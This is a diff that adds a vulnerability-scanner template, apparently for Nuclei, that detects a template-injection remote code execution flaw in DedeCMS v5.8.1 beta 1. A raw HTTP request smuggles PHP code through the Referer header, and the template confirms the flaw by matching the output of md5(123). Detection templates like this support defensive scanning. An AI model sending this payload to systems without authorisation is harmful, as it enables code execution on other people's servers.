@@ -1,0 +1,35 @@
+id: Dedecms-plus-ssti-rce
+info:
+  name: Dedecms-plus-ssti-rce
+  author: apple
+  severity: critical
+  description: DedeCMS v5.8.1 beta 1 SSTI RCE
+  reference:
+    - https://xz.aliyun.com/t/10519
+  tags: dedecms
+http:
+  - raw:
+      - |+
+        GET /plus/flink.php?dopost=save HTTP/1.1
+        Host: {{Hostname}}
+        Referer: <?php echo "md5"(123);die;/*
+        sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: lg=cn; PbootSystem=6ad6eftq7ei0gseljmr5gd4a6r
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "202cb962ac5"
